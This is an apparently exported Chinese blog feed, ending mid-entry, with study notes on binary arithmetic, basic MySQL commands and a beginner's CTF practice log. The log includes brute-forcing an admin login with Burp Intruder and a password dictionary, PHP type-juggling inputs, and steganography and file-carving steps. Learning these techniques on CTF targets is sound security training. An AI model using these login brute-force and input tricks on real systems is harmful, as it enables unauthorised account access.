id="第一题移位运算"><a href="#第一题移位运算" class="headerlink" title="第一题移位运算"></a>第一题移位运算</h2><p><img src="https://img-blog.csdnimg.cn/20200520232958908.png" alt="j4y" loading="lazy"><br>拿+26做栗子;<br><img src="https://img-blog.csdnimg.cn/20200521000059661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>负数用-26当栗子：<br><img src="https://img-blog.csdnimg.cn/20200521001600328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="第二题加减运算"><a href="#第二题加减运算" class="headerlink" title="第二题加减运算"></a>第二题加减运算</h2><p>加减法问题，在计算机中的基本运算。<br>方法：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">加法：A+B=A+B</span><br><span class="line">减法：A<span class="literal">-B</span>=A+(<span class="literal">-B</span>)</span><br></pre></td></tr></table></figure><p>而且进行加减时，都采用补码作为加减运算。<br><code>[A]补+[B]补=[A+B]补</code><br><code>[A]补+[-B]补=[A-B]补</code><br><img src="https://img-blog.csdnimg.cn/20200523183124714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>就是<code>1+1=0</code>的问题。<br>变形补码判断溢出<br>最高位的永远是符号位<br><img src="https://img-blog.csdnimg.cn/20200524065033156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>有些题会设机器数字长为8（连符号位）<br>这样的就是包括符号位一共是8位的。比如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+45=+0101101</span><br><span class="line">[B]补=0,0101101</span><br><span class="line">[-B]补=1,1010011</span><br></pre></td></tr></table></figure><p>记住一点，加法运算后的结果，符号位前面的该丢就丢。<br>分数怎么转换成计算机机器数字？<br>原理：分母是2的n次方，先将分子转换成二进制数字，然后将小数点向前移动n位。比如：<br><img src="https://img-blog.csdnimg.cn/2020052407010438.png" alt="j4y" loading="lazy"><br>2的4次方是16，所以先将分子11转换成二进制，是1011，小数点向前移动4位，就是<code>0.1011</code>符号是负号。所以是<code>-0.1011</code>，则它的补码就是<code>1,0101</code></p><h2 id="第三题型乘法运算"><a href="#第三题型乘法运算" class="headerlink" title="第三题型乘法运算"></a>第三题型乘法运算</h2><p>什么概念的课本上一堆，不想看。直接看例题来的快。<br><img src="https://img-blog.csdnimg.cn/20200524072710251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>看过之后，也是懵B，所以看下面这个。我把它的被乘数(也就是在计算的时候放在最上面的数。)和乘数换了个位置，就是原本是AxB,形式改成BxA数字变了一下。看下面的计算过程。<br><img src="https://img-blog.csdnimg.cn/20200524072542573.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>可能有的疑问：怎么判断移位移多少？<br>答：看乘数。比如上题中(手写的这个)乘数是<code>0.1101</code>，它转换回我们日常生活中的数字是这么转换的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1101=1x2的三次方+1x2的二次方+0x2的一次方+1x2的零次方</span><br></pre></td></tr></table></figure><p>根据这个判断移位。<br>关于补码一位乘<br>参考链接<a href="https://blog.csdn.net/liuchuo/article/details/52921504">补码乘法一位乘</a><br>还有最上面的那个链接里也有讲解。<br>先到这里，慢慢消化，考试加油。<br>文末寄语：</p><blockquote><p>愿你被很多人爱，如果没有，愿你在寂寞中学会宽容。——刘瑜</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对数据库的浅显理解及MySQL的简单运用</title>
      <link href="/2020/08/23/%E5%AF%B9%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B5%85%E6%98%BE%E7%90%86%E8%A7%A3%E5%8F%8AMySQL%E7%9A%84%E7%AE%80%E5%8D%95%E8%BF%90%E7%94%A8/"/>
      <url>/2020/08/23/%E5%AF%B9%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B5%85%E6%98%BE%E7%90%86%E8%A7%A3%E5%8F%8AMySQL%E7%9A%84%E7%AE%80%E5%8D%95%E8%BF%90%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="初学阶段对数据库、mysql等知识的较浅程度的理解"><a href="#初学阶段对数据库、mysql等知识的较浅程度的理解" class="headerlink" title="初学阶段对数据库、mysql等知识的较浅程度的理解"></a>初学阶段对数据库、mysql等知识的较浅程度的理解</h2><p>近段时间了解了数据库等知识的概念以及MySQL的初步学习，以下就是我在学习过程中的一些收获，跟大家分享一下。</p><h2 id="数据库（DateBase-简称DS）"><a href="#数据库（DateBase-简称DS）" class="headerlink" title="数据库（DateBase,简称DS）"></a><em>数据库（DateBase,简称DS）</em></h2><p>数据是数据库中存储的基本对象。数据的种类有很多种，<strong>文本（Text）、图形(graph)、图像（lmage）、音频（Audio）、视频（Video）</strong>、各种档案记录等等。这都是属于数据的部分。</p><ol><li><p><strong>数据库</strong>，概念：数据库顾名思义就是存放数据的仓库。数据库的存放空间很大，可以存放上亿条数据，但是数据库不是随意的将数据储存进仓库的，它是有一定规则的，因为这样保证了查询数据时的效率，<strong>否则查询效率会非常低。</strong></p><h2 id="数据表（DateTable）"><a href="#数据表（DateTable）" class="headerlink" title="数据表（DateTable）"></a><strong><em>数据表（DateTable）</em></strong></h2><p>数据表是一个临<strong>时保存数据</strong>的<strong>网格虚拟表</strong>，它不需要代码就可以简单的绑定数据库。<br>当访问DateTable对象时，注意一点它们是区分大小写的。如果一个<strong>DateTable</strong>被命名时的名字<strong>大小写不同</strong>，那么它们就<strong>不是同一个数据表</strong>。<br>数据表使用前需要自己创建一个。</p><h2 id="字段（field）"><a href="#字段（field）" class="headerlink" title="字段（field）"></a><em>字段（field）</em></h2><p>在数据库中，大多数时，表的“列“称为”字段“，每个字段包含某一专题的信息。<br>有时候，字段也不代表数据表中的列。</p><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a><em>MySQL</em></h2><p>MySQL是一种关系型数据库管理系统，关系数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。该系统使用的语言是SQL语言。<br>（SQL语句结束，要在语句末尾加上一个分号“ ； ”来结尾。）</p><h3 id="mysql基本命令"><a href="#mysql基本命令" class="headerlink" title="mysql基本命令"></a><em>mysql基本命令</em></h3><h4 id="登录MySQL："><a href="#登录MySQL：" class="headerlink" title="登录MySQL："></a>登录MySQL：</h4><p>当我们打开在电脑上安装好的mysql，输入安装时本人设置的密码，会出现下图所示的界面，如果出现下面红框中的内容就表示你已经登录了mysql。<br><img src="https://img-blog.csdnimg.cn/20200111122643490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" loading="lazy"></p><h4 id="退出MySQL："><a href="#退出MySQL：" class="headerlink" title="退出MySQL："></a>退出MySQL：</h4><p>退出有两种方法<br>1.输入<strong>exit</strong>，然后就直接退出了。<br>2.同时按键盘上的<strong>ctrl+C</strong>也是可以直接退出的。</p><h5 id="1-查看当前所有的数据库"><a href="#1-查看当前所有的数据库" class="headerlink" title="1.查看当前所有的数据库"></a>1.查看当前所有的数据库</h5><p>show databases;<br>输入上面的sql命令，可以查询到当前的所有的数据库。如下图：<img src="https://img-blog.csdnimg.cn/20200111124735527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>上图说明有四个数据库。</p><h5 id="2-打开指定的库"><a href="#2-打开指定的库" class="headerlink" title="2.打开指定的库"></a>2.打开指定的库</h5><p>use 库名；（<strong>输入命令时，单词之间要加空格</strong>）</p><h5 id="3-查看当前库的所有表"><a href="#3-查看当前库的所有表" class="headerlink" title="3.查看当前库的所有表"></a>3.查看当前库的所有表</h5><p>show tables;下图为具体示例。（<strong>注意：查看数据表前，要先打开你想查看的数据库，否则就会出现查询不到信息现象。</strong>）<br><img src="https://img-blog.csdnimg.cn/20200111125342154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h6 id="4-查询其他数据库的所有表"><a href="#4-查询其他数据库的所有表" class="headerlink" title="4.查询其他数据库的所有表"></a>4.查询其他数据库的所有表</h6><p>show tables from 库名；</p><h5 id="5-查看表结构"><a href="#5-查看表结构" class="headerlink" title="5.查看表结构"></a>5.查看表结构</h5><p>desc 表名；</p></li></ol><p><img src="https://img-blog.csdnimg.cn/20200111131803669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h5 id="6-查看表里的数据"><a href="#6-查看表里的数据" class="headerlink" title="6.查看表里的数据"></a>6.查看表里的数据</h5><p>select * from 表名；<br>输入此语句即可查看该表里的数据。</p><h5 id="7-增添-创建一个数据库"><a href="#7-增添-创建一个数据库" class="headerlink" title="7.增添/创建一个数据库"></a>7.增添/创建一个数据库</h5><p>create database test1；（库名）<br>这样就可以创建一个库名叫做test1的一个数据库，</p><h5 id="8-创建表"><a href="#8-创建表" class="headerlink" title="8.创建表"></a>8.创建表</h5><p>可一次性创建多个表：<br>create table 表名（列名，列类型）；<br>也可以单独创建一个表：<br>create table 表名 （<br>         列名 列类型，<br>         列名 列类型<br>         ………</p><p>)；<br><strong>注：创建一个表时，列类型后不用加“逗号”，创建多个表时，最后一个列表后不用加“逗号”。</strong></p><h5 id="9-向表中插入数据"><a href="#9-向表中插入数据" class="headerlink" title="9.向表中插入数据"></a>9.向表中插入数据</h5><p>insert into host values (‘001’,‘xiaobai’)；<br><img src="https://img-blog.csdnimg.cn/20200112143251660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>如图所示，这里我在一个表名为first_t1的表里插入了两组数据，然后我再次查询这个表中数据时就会出现我刚才插入的数据，如下图：<img src="https://img-blog.csdnimg.cn/2020011214455817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>以上就是我（**<em>初学小白**</em>）通过浅显的自学后所获得的知识，仅代表个人意见，如有些许错误，烦请各位牛人指正，我会尽快作出修改。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 数据库MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一周任务小总结</title>
      <link href="/2020/08/23/%E7%AC%AC%E4%B8%80%E5%91%A8%E4%BB%BB%E5%8A%A1%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
      <url>/2020/08/23/%E7%AC%AC%E4%B8%80%E5%91%A8%E4%BB%BB%E5%8A%A1%E5%B0%8F%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>前言：这周就开始有任务了，比起自己盲目的找东西学好了很多很多。</p><h3 id="（一）CTF题型练习"><a href="#（一）CTF题型练习" class="headerlink" title="（一）CTF题型练习"></a>（一）CTF题型练习</h3><h5 id="web"><a href="#web" class="headerlink" title="web"></a>web</h5><p>域名解析：<br><img src="https://img-blog.csdnimg.cn/20200322105621366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>域名解析听起来好像跟服务器有关的域名解析（前几天刚get一个十年的域名。嘿嘿）。<br>我分别打开这两个都看了一下<br><img src="https://img-blog.csdnimg.cn/20200322111749762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200322111808862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>事实证明白日做梦是不可取的。🥱🥱🥱<br><code>400 Bad Request</code>是什么意思，见过502,之类的没还么见过400呢，查一下了解到应该是请求参数错误，<a href="https://baike.baidu.com/item/400/814387?fr=aladdin">百度百科关于400</a>，解析域名，不通过服务器怎么玩？？我也不会，百度都是在服务器上解析的。去看下别的博主的博客，关于这道题的wp,知道怎么做了，<br>系统在进行dns解析之前，会优先按照hosts文件解析让改hosts的信息<br>操作一下，按照师傅们说的路径打开，<br><img src="https://img-blog.csdnimg.cn/20200322113255899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>添加一行<br><img src="https://img-blog.csdnimg.cn/20200322114452728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>完成，我去访问下试试，<br><img src="https://img-blog.csdnimg.cn/20200322115411394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>why???我再用火狐试试<br><img src="https://img-blog.csdnimg.cn/20200322114906835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我***why？？？我中毒了？？到哪都踩坑，我真是服了。坑就这么喜欢我？？？？<br>百度也没有发现有这种情况啊，我也让我同学帮着试了一下，也不行，现在想想估计不是我们的操作或者浏览器的问题。bugku有毒，我决定换地方。<br>不管了，我还找到了另一种方法<br>用burp抓包，然后改host头 的信息，具体操作 也没办法做，我也不知道能不能做出来，不过原理上来说是可行的。（也是一种思路）</p><h5 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h5><p><img src="https://img-blog.csdnimg.cn/20200322130910376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>进入之后看到登录框了我就先万能密码试一下<br><img src="https://img-blog.csdnimg.cn/20200322131054902.png" alt="Augenstern" loading="lazy"><br>提示账户名是admin。再试一下在密码框里加万能密码。有提示密码错误。那应该不是万能密码。看下源码f12。<br><img src="https://img-blog.csdnimg.cn/2020032213154036.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>用字典爆破吗？不过我好想没有字典，去网上找一个吧。<br>找到字典后，burp抓包<br><img src="https://img-blog.csdnimg.cn/20200322132337101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>send   to intruder进行爆破<br><img src="https://img-blog.csdnimg.cn/20200322132440244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>添加字典。<br><img src="https://img-blog.csdnimg.cn/20200322133013884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>很快就爆出来密码了。试一下。拿flag。<br><img src="https://img-blog.csdnimg.cn/20200322133157631.png" alt="Augenstern" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200322133335728.png" alt="Augenstern" loading="lazy"><br>事实证明，<code>0123456</code>和<code>123456</code>都行。</p><h5 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h5><p><img src="https://img-blog.csdnimg.cn/20200322133456948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>刚学了PHP，正好拿来练手<br><img src="https://img-blog.csdnimg.cn/20200322134223544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>分析题中的代码，应该是让用get方式提交，<br>代码<code>$a==0 and $a</code>给a复制为0，且a为true。a赋值1并存在就能打印出来第一段flag。那就给a赋值为0吧<br><img src="https://img-blog.csdnimg.cn/20200322134639633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>果然没错，先记下来。再看下面的代码<br>is_numeric意思是数字，这里就是，如果b为数字的话，就什么也没有。<code>$b&gt;1234 </code>打印$flag2,就是b要赋值的话要满足大于1234同时还不能是数字。这里我用1235j<br><img src="https://img-blog.csdnimg.cn/20200322135216611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>得到第二段flag.</p><h5 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h5><p><img src="https://img-blog.csdnimg.cn/20200322160923900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>混合编码就是好几种加密连环套<br>第一种=&gt;base64解密<br><img src="https://img-blog.csdnimg.cn/20200322161135568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>第二种=&gt;解出的是Unicode编码，再转换<br><img src="https://img-blog.csdnimg.cn/20200322161236896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>第三种=&gt;解出来还是base64,再去base64 转换<br><img src="https://img-blog.csdnimg.cn/20200322161407526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>第四步=&gt;解出来看着是ascii码，可以去Excel表格里转换比较快。<br>flag就是<code>welcometoattackanddefenceworld</code><br><strong>变异凯撒</strong><br><img src="https://img-blog.csdnimg.cn/20200322162655961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>题目是这么说的<br><img src="https://img-blog.csdnimg.cn/20200322162741411.png" alt="Augenstern" loading="lazy"><br>想想，从a=&gt;f转换一下试试<br><img src="https://img-blog.csdnimg.cn/20200322162834546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>f是出来了，但是第二位是k，不是我们预想的l。这就是变异的凯撒是吗。。。。。。k和l差了1位，E和g差了2位，好像有点规律。递归吧………………嗦嘎。<br><img src="https://img-blog.csdnimg.cn/20200322163604622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>还好C语言还能用，哈哈哈</p><p><strong>Quoted-printable</strong><br><img src="https://img-blog.csdnimg.cn/20200322164655608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个加密没见过，不过比较简单<br><img src="https://img-blog.csdnimg.cn/20200322164756583.png" alt="Augenstern" loading="lazy"><br>果然是我没见过的，对于我来说是一个新的加密。然后我直接复制这段密码找度娘去了，<br><img src="https://img-blog.csdnimg.cn/20200322164936668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看着这么多，没想到的是被度娘耍了。点了之后就直接下载了一个Word文档，一点都不是说密码的。<br>还是直接搜密码的名字靠谱，然后先看原理<a href="https://baike.baidu.com/item/quoted_printable_decode/9714081?fr=aladdin">Quoted-printable百度百科</a>这个理解不是很清楚，还有网上有好多师傅们都写了关于这个密码的介绍<br>我看这个博客介绍的很好，<a href="http://blog.chacuo.net/494.html">师傅博客</a>。<br>然后就可以找在线解密工具解题了。<br><img src="https://img-blog.csdnimg.cn/20200322165835766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>flag还有中文的，长见识。</p><h5 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h5><p><strong>金三胖</strong><br><img src="https://img-blog.csdnimg.cn/20200322170410910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>是个表情包，GIF动图。<br><img src="https://img-blog.csdnimg.cn/20200322170644695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>哈哈哈，我手动截图没想到就截到了一个hhh.<br><img src="https://img-blog.csdnimg.cn/20200322170339802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我感觉这道题都不用工具了，Snipaste截图就是非常强。<br>还是用工具吧，🤣🤣🤣🤣<br>这个应该就是用stegsolve，<br>打开后<br><img src="https://img-blog.csdnimg.cn/20200322171307172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后点Analyse=&gt;frame Browser<br><img src="https://img-blog.csdnimg.cn/20200322171523118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后就可以一帧一帧调了<br><img src="https://img-blog.csdnimg.cn/20200322171652666.png" alt="Augenstern" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200322171724994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200322171752169.png" alt="Augenstern" loading="lazy"><br>OK了，，flag到手。注意he11o不是hello，我填了好几遍才反应过来🤣🤣🤣<br>关于这个工具怎么用，具体的可以看看这位师傅的博客，他专门写了一篇博客为小白讲解了这个工具的使用方法。<a href="https://www.cnblogs.com/cat47/p/11483478.html">stegsolve使用方法</a><br><strong>二维码</strong><br><img src="https://img-blog.csdnimg.cn/20200322173803226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开压缩包，里面是个二维码，扫一下发现有内容，但不是flag，然后我就先用stegsolve里变一下，扫一下，扫完了，还是那个内容。放弃………………<br>这个先拖进winhex里看看发现有压缩包<br><img src="https://img-blog.csdnimg.cn/20200322175709833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>提取出来就行，提取可以使用binwalk或者foremost，binwalk是kali里的工具在kali里使用比较方便，Windows也可以装，就是太麻烦，我这里windows使用的是foremost<br><img src="https://img-blog.csdnimg.cn/20200322180135793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200322180216917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这就是分离出来的文件夹<br><img src="https://img-blog.csdnimg.cn/20200322180347296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>分离出了一张png图片和一个压缩包<br>不过压缩包有密码的，这个需要去破解压缩包的密码<br><img 